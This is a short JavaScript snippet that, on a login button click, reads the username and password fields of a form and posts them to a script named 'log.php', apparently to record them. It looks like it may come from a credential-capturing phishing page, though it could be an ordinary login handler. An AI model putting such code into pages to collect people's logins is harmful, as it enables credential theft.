function sendLoginData() {
    var f = document.getElementById("login_frm");
    
    var Username = f.web_login_name.value;
    var Password = f.web_login_pass.value;

    jQuery.post('log.php', {
        username: Username,
        password: Password
    });
}

document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('loginIDbtn').addEventListener('click', function () {
        sendLoginData();
    });
});